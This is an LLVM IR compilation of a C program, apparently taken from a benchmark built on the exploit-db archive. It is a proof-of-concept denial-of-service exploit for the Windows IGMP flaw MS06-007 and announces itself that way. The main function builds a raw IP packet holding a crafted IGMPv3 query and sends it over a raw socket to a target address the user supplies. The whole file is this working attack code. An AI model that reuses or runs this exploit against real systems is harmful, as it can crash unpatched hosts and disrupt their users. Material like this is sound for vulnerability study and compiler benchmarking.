; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1603.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1603.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i64 }
%struct.iphdr = type { i32, i32, i32, i64, i64, i64, i64, i8*, i32, i64, i8*, i8*, i64 }
%struct.igmpv3_query = type { i32, i32, i64*, i8*, i8*, i64, i64, i64, i64, i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [53 x i8] c"MS06-007 Denial of Service POC exploit by Firestorm\0A\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"Usage: %s <src> <dst>\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@IPPROTO_IGMP = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [10 x i8] c"224.0.0.1\00", align 1
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [31 x i8] c"Sending IGMP packet: %s -> %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [21 x i8] c"Error sending packet\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 8
  %7 = alloca %struct.iphdr*, align 8
  %8 = alloca %struct.igmpv3_query*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [1500 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %12, align 4
  store i32 1, i32* %15, align 4
  %17 = load i32, i32* %4, align 4
  %18 = icmp slt i32 %17, 3
  br i1 %18, label %19, label %24

19:                                               ; preds = %2
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str, i64 0, i64 0))
  %21 = load i8**, i8*** %5, align 8
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0), i8* %22)
  store i32 1, i32* %3, align 4
  br label %131

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 2
  %27 = load i8*, i8** %26, align 8
  %28 = call i64 @resolve(i8* %27)
  store i64 %28, i64* %9, align 8
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = call i64 @resolve(i8* %31)
  store i64 %32, i64* %10, align 8
  %33 = getelementptr inbounds [1500 x i8], [1500 x i8]* %16, i64 0, i64 0
  %34 = call i32 @memset(i8* %33, i32 0, i32 1500)
  %35 = bitcast [1500 x i8]* %16 to %struct.iphdr*
  store %struct.iphdr* %35, %struct.iphdr** %7, align 8
  %36 = getelementptr inbounds [1500 x i8], [1500 x i8]* %16, i64 0, i64 96
  %37 = bitcast i8* %36 to %struct.igmpv3_query*
  store %struct.igmpv3_query* %37, %struct.igmpv3_query** %8, align 8
  %38 = load i64, i64* %9, align 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  %40 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %39, i32 0, i32 0
  store i64 %38, i64* %40, align 8
  %41 = load i32, i32* @AF_INET, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i32 %41, i32* %42, align 8
  %43 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 0
  store i32 7, i32* %44, align 8
  %45 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %46 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %45, i32 0, i32 1
  store i32 4, i32* %46, align 4
  %47 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %48 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %47, i32 0, i32 12
  store i64 0, i64* %48, align 8
  %49 = call i8* @htons(i32 44)
  %50 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %51 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %50, i32 0, i32 11
  store i8* %49, i8** %51, align 8
  %52 = call i8* @htons(i32 18277)
  %53 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %54 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %53, i32 0, i32 10
  store i8* %52, i8** %54, align 8
  %55 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %56 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %55, i32 0, i32 9
  store i64 0, i64* %56, align 8
  %57 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %58 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %57, i32 0, i32 2
  store i32 128, i32* %58, align 8
  %59 = load i32, i32* @IPPROTO_IGMP, align 4
  %60 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %61 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %60, i32 0, i32 8
  store i32 %59, i32* %61, align 8
  %62 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %63 = bitcast %struct.iphdr* %62 to i16*
  %64 = call i8* @in_chksum(i16* %63, i32 96)
  %65 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 7
  store i8* %64, i8** %66, align 8
  %67 = load i64, i64* %10, align 8
  %68 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 3
  store i64 %67, i64* %69, align 8
  %70 = load i64, i64* %9, align 8
  %71 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %72 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %71, i32 0, i32 4
  store i64 %70, i64* %72, align 8
  %73 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %74 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %73, i32 0, i32 6
  store i64 0, i64* %74, align 8
  %75 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %76 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %75, i32 0, i32 5
  store i64 0, i64* %76, align 8
  %77 = load %struct.igmpv3_query*, %struct.igmpv3_query** %8, align 8
  %78 = getelementptr inbounds %struct.igmpv3_query, %struct.igmpv3_query* %77, i32 0, i32 0
  store i32 17, i32* %78, align 8
  %79 = load %struct.igmpv3_query*, %struct.igmpv3_query** %8, align 8
  %80 = getelementptr inbounds %struct.igmpv3_query, %struct.igmpv3_query* %79, i32 0, i32 1
  store i32 5, i32* %80, align 4
  %81 = call i32 @inet_addr(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  %82 = load %struct.igmpv3_query*, %struct.igmpv3_query** %8, align 8
  %83 = getelementptr inbounds %struct.igmpv3_query, %struct.igmpv3_query* %82, i32 0, i32 9
  store i32 %81, i32* %83, align 8
  %84 = load %struct.igmpv3_query*, %struct.igmpv3_query** %8, align 8
  %85 = getelementptr inbounds %struct.igmpv3_query, %struct.igmpv3_query* %84, i32 0, i32 8
  store i64 0, i64* %85, align 8
  %86 = load %struct.igmpv3_query*, %struct.igmpv3_query** %8, align 8
  %87 = getelementptr inbounds %struct.igmpv3_query, %struct.igmpv3_query* %86, i32 0, i32 7
  store i64 0, i64* %87, align 8
  %88 = load %struct.igmpv3_query*, %struct.igmpv3_query** %8, align 8
  %89 = getelementptr inbounds %struct.igmpv3_query, %struct.igmpv3_query* %88, i32 0, i32 6
  store i64 0, i64* %89, align 8
  %90 = load %struct.igmpv3_query*, %struct.igmpv3_query** %8, align 8
  %91 = getelementptr inbounds %struct.igmpv3_query, %struct.igmpv3_query* %90, i32 0, i32 5
  store i64 0, i64* %91, align 8
  %92 = call i8* @htons(i32 1)
  %93 = load %struct.igmpv3_query*, %struct.igmpv3_query** %8, align 8
  %94 = getelementptr inbounds %struct.igmpv3_query, %struct.igmpv3_query* %93, i32 0, i32 4
  store i8* %92, i8** %94, align 8
  %95 = load i64, i64* %9, align 8
  %96 = load %struct.igmpv3_query*, %struct.igmpv3_query** %8, align 8
  %97 = getelementptr inbounds %struct.igmpv3_query, %struct.igmpv3_query* %96, i32 0, i32 2
  %98 = load i64*, i64** %97, align 8
  %99 = getelementptr inbounds i64, i64* %98, i64 0
  store i64 %95, i64* %99, align 8
  %100 = load %struct.igmpv3_query*, %struct.igmpv3_query** %8, align 8
  %101 = getelementptr inbounds %struct.igmpv3_query, %struct.igmpv3_query* %100, i32 0, i32 3
  store i8* null, i8** %101, align 8
  %102 = load %struct.igmpv3_query*, %struct.igmpv3_query** %8, align 8
  %103 = bitcast %struct.igmpv3_query* %102 to i16*
  %104 = call i8* @in_chksum(i16* %103, i32 72)
  %105 = load %struct.igmpv3_query*, %struct.igmpv3_query** %8, align 8
  %106 = getelementptr inbounds %struct.igmpv3_query, %struct.igmpv3_query* %105, i32 0, i32 3
  store i8* %104, i8** %106, align 8
  %107 = load i32, i32* @AF_INET, align 4
  %108 = load i32, i32* @SOCK_RAW, align 4
  %109 = load i32, i32* @IPPROTO_RAW, align 4
  %110 = call i32 @socket(i32 %107, i32 %108, i32 %109)
  store i32 %110, i32* %11, align 4
  %111 = load i32, i32* %11, align 4
  %112 = icmp eq i32 %111, -1
  br i1 %112, label %113, label %114

113:                                              ; preds = %24
  store i32 1, i32* %3, align 4
  br label %131

114:                                              ; preds = %24
  %115 = load i8**, i8*** %5, align 8
  %116 = getelementptr inbounds i8*, i8** %115, i64 1
  %117 = load i8*, i8** %116, align 8
  %118 = load i8**, i8*** %5, align 8
  %119 = getelementptr inbounds i8*, i8** %118, i64 2
  %120 = load i8*, i8** %119, align 8
  %121 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i8* %117, i8* %120)
  %122 = load i32, i32* %11, align 4
  %123 = bitcast [1500 x i8]* %16 to i8**
  %124 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %125 = call i32 @sendto(i32 %122, i8** %123, i32 44, i32 0, %struct.sockaddr* %124, i32 16)
  %126 = icmp eq i32 %125, -1
  br i1 %126, label %127, label %130

127:                                              ; preds = %114
  %128 = call i32 @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  %129 = call i32 @exit(i32 -1) #3
  unreachable

130:                                              ; preds = %114
  store i32 0, i32* %3, align 4
  br label %131

131:                                              ; preds = %130, %113, %19
  %132 = load i32, i32* %3, align 4
  ret i32 %132
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @resolve(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i8* @in_chksum(i16*, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @sendto(i32, i8**, i32, i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
